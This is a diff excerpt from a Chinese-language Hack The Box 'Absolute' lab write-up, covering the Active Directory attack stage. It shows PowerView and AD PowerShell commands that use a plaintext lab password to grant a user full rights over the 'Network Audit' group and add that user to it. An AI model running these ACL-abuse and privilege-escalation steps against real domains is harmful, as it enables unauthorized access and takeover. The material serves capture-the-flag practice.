@@ -255,11 +255,17 @@ anyway总而言之，我们按照上述步骤成功是把smb目录内的东西�
 # AD域渗透
 那么就开始实操了，对于第一步我们可以使用 Windows 或 Linux，我使用windows，那么我们就得导入一下之前打Forest用到的poverview模块了
 `Import-Module .\PowerView.ps1`
+
 ` $pass=ConvertTo-SecureString 'AbsoluteLDAP2022!' -AsPlain -Force`
+
 `$cred=new-object system.management.automation.pscredential('absolute.htb\m.lovegod',$pass)`
+
 `Add-DomainObjectAcl -Credential $cred  -TargetIdentity "Network Audit" -Rights all -DomainController "dc.absolute.htb" -PrincipalIdentity "m.lovegod"`
+
 `Add-ADPrincipalGroupMembership -Identity m.lovegod -MemberOf "Network Audit" -Credential $cred -Server dc.absolute.htb`
+
 ` Get-DomainGroupMember -Identity "Network Audit" -Domain "absolute.htb" -DomainController "dc.absolute.htb" -Credential $cred`
+
 一套流程下来把m.lovegod用户加入到了Network Audit用户组里，并且赋予了all权限
 ![image.png](https://cdn.nlark.com/yuque/0/2023/png/32634994/1681474296184-47255a7c-2115-4d67-a59e-28bbb5bcd3a4.png#averageHue=%23022557&clientId=u3f4bc52a-335f-4&from=paste&height=482&id=u614ada5f&name=image.png&originHeight=603&originWidth=1114&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=50632&status=done&style=none&taskId=ua99988fb-f7b1-44d7-9240-7ddfad8b5f8&title=&width=891.2)
 ## 坑点
